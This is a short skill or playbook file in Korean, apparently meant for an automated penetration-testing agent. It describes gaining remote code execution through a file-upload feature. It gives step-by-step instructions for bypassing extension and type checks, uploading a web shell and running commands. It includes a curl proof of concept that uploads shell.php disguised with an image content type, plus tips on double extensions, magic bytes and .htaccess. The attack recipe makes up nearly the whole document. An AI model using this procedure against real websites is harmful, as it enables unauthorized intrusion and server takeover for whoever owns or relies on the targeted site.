---
name: file-upload-rce
description: 파일 업로드로 웹셸/RCE
---
## When
업로드 기능 존재

## Tools
curl

## Procedure
1) 허용 확장자·검증 우회
2) 웹셸 업로드
3) 경로 접근
4) 명령 실행

## PoC
```
curl -F 'f=@shell.php;type=image/png' $U/upload
```

## Pitfalls
이중확장자·매직바이트·`.htaccess`; 실행 디렉토리 확인
